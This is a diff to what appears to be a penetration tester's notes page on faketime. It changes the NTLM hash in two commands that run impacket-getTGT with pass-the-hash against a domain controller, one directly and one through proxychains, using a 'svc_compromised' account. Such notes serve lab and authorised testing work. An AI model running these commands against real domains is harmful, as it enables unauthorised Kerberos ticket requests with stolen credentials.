@@ -5,12 +5,12 @@
 
 This is very useful in [[Attacking-Kerberos]] and [[Local-Setup]] as work-around for `ntp` related lack of presence in remote or your Linux Distribution for Network OPSEC and Packet economy. For example using `impacket` - [[Impacket-Cheatsheet]]:
 ```bash 
-faketime -f '+10h' impacket-getTGT -dc-ip 10.10.10.10 -hashes 1D8FD23873EBC8933BF8DFC56112CC87:1D8FD23873EBC8933BF8DFC56112CC87 $vulnadDomain.$tld/svc_compromised
+faketime -f '+10h' impacket-getTGT -dc-ip 10.10.10.10 -hashes DCE2C5EBA67EE536B1A0597217569A39:DCE2C5EBA67EE536B1A0597217569A39 $vulnadDomain.$tld/svc_compromised
 ```
 
 It can also be used after [[Proxychains]]
 ```bash
-proxychains faketime -f '+10h' impacket-getTGT -dc-ip 10.10.10.10 -hashes 1D8FD23873EBC8933BF8DFC56112CC87:1D8FD23873EBC8933BF8DFC56112CC87 $vulnadDomain.$tld/svc_compromised
+proxychains faketime -f '+10h' impacket-getTGT -dc-ip 10.10.10.10 -hashes DCE2C5EBA67EE536B1A0597217569A39:DCE2C5EBA67EE536B1A0597217569A39 $vulnadDomain.$tld/svc_compromised
 ```
 #### Usage
 
